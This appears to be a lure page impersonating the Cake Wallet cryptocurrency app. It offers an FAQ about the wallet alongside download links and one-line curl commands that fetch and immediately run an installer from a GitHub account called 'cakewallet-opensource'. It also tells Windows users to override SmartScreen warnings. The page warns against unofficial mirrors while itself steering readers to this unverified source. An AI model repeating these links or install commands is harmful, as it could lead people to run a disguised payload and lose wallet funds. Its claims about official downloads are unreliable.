![Cake Wallet what it is guide](assets/cake-wallet-what-it-is-article-banner.png)

# What Is Cake Wallet and Who Makes It

The product, the maker, the platforms, and the one-word name people type.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Cake Wallet is an open-source, non-custodial multi-currency wallet from Cake Labs, shipping on mobile and desktop. cakewallet is the same product, cakewallet.com is its official site, and there is no web wallet or browser extension. You hold the keys, and one recovery phrase restores a wallet anywhere.

<!-- ARTICLE-BODY-BEGIN -->

## What Cake Wallet is
It is a wallet, not an exchange and not an account. You install it, create or restore a wallet, and it holds keys for Bitcoin, Monero, Litecoin, Ethereum and other coins on your device. Nothing about that requires a sign-up, an email or a password.

The one-word spelling matters because searches for `cakewallet` surface a mirror, an unofficial browser extension and social accounts before the official site. None of those is the app. <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">Get the current release</a> from the project's own release page, and the question of which surface is real disappears.

## Who controls the funds
You do. Cake Wallet is non-custodial: the project has no server that can move your balance and no process that can restore it. That is the whole promise, and it comes with the whole responsibility.

Custody is worth understanding before you fund anything. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-safe-custody-keys.md">Cake Wallet safe custody</a> covers keys, licences and the backup that makes self-custody survivable.

## What it can hold
Bitcoin including Lightning, Monero, Litecoin including MWEB, Ethereum and EVM tokens, Bitcoin Cash, Zcash, Tron, Solana, Polygon, Nano, Haven, Arbitrum and BNB Smart Chain are evidenced across the documentation and release notes. Some tokens need adding by contract address before they appear.

The list changes between versions, so check the coin page for the current set. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md">Cake Wallet supported coins</a> separates "chain supported" from "token visible", which is the difference behind most support questions.

## Monero first
Monero is the coin the project is known for: view keys stay on the device, subaddresses and accounts are supported, and you can set a restore height for faster syncing. Buying, swapping and node choice all work for XMR inside the app.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-monero.md">Use Cake Wallet for Monero</a> is the hub for sync, rescan, node and privacy topics, so this page does not repeat them.

## The Monero-only sibling
The same codebase also builds a Monero-only wallet published at Monero.com. It is a separate app with one coin and a smaller surface, not a different company or a trial version.

Choosing between them is a matter of whether you want one coin or several. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-vs-monero-only.md">Cake Wallet or the Monero-only wallet</a> compares the two builds directly.

## Who makes it and where it lives
Cake Labs makes Cake Wallet, founded in 2017 with its first app in 2018, and the company publishes the source in a public repository. The company is not the custodian: it writes software and ships releases, and it cannot access your wallet.

That distinction answers most ownership questions. "Who owns Cake Wallet" is the company; "who owns my wallet" is you.

## Quick answers
| Question people type | Answer |
| --- | --- |
| Is Cake Wallet free? | Yes. The app is free; network fees and provider fees are separate. |
| Is it non-custodial? | Yes, keys are generated and held on your device. |
| Is it decentralised? | It is decentralized in the sense that matters: non-custodial software with no account server, on coins that run their own networks. |
| What is it used for? | Holding, sending, receiving, swapping and buying cryptocurrency, especially Monero. |
| Why isn't my Cake Wallet working? | Usually an old build, a node it cannot reach, or a sync that has not finished. |
| Is it cryptocurrency? | It is a wallet for cryptocurrency, not a coin itself. |
| Is it a local wallet? | Yes, the wallet data lives on the device. |
| Is it hot or cold? | It is a hot wallet; Cupcake turns a spare phone into an offline signer. |
| Where is it based? | The company is Cake Labs; the app itself runs wherever you install it. |
| Is it traceable? | Transparent chains are public, so an address there can be traced by anyone reading it; Monero hides sender, receiver and amount. |
| Does it work in the UK? | The wallet does; buying with fiat depends on the provider serving your region. |
| How much does it charge? | Nothing for holding or sending beyond the network fee. |
| What does "cake wallet" mean? | The brand name of this wallet app; also a bakery term in other searches. |
| How do I remove a wallet? | Delete it from the wallet list after confirming the phrase is backed up. |
| Where is my address? | On the receive screen of the wallet and account you have open. |
| Why does it say disconnected? | The app cannot reach a node; switch or add one. |
| Why does it say my wallet is damaged? | The wallet data is incomplete; restore from the phrase. |
| How do I add money? | Receive a transfer, buy through a provider, or swap into it. |
| How long does it take? | A first Monero sync can take hours; sends depend on confirmations. |

## FAQ
### Who owns Cake Wallet?
Cake Labs builds it. The wallet and its keys belong to whoever installed it.
### Is there a web wallet or browser extension?
No. There is no official web wallet and no official browser extension, whatever a search result implies.
### Is Cake Wallet any good?
It is a mature non-custodial wallet with Monero as a first-class coin. Whether it suits you depends on the coins you hold and whether you will keep a backup.
### How do I contact Cake Wallet support?
Through the in-app support path, the documented email and the public repository. No support channel needs your phrase.
### Can I use a USB stick as a crypto wallet?
A USB stick can store a backup file or a phrase, but it is storage, not a wallet. The wallet software still needs a device to run on.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Cake Wallet supported coins](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md) · [Cake Wallet safe custody](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-safe-custody-keys.md) · [Cake Wallet or the Monero-only wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-vs-monero-only.md) · [use Cake Wallet for Monero](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-monero.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
